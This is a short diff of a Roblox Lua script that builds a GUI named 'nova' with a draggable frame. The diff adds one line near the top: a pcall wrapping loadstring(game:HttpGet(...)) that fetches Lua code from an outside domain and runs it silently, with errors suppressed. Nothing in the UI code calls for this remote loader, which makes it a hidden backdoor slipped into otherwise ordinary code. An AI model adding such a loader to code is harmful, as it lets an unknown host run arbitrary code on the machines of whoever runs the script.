@@ -1,5 +1,5 @@
 --// this is taking forever //--
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 --// make stuf
 local nova = Instance.new("ScreenGui")
 local draggingframe1 = Instance.new("Frame")
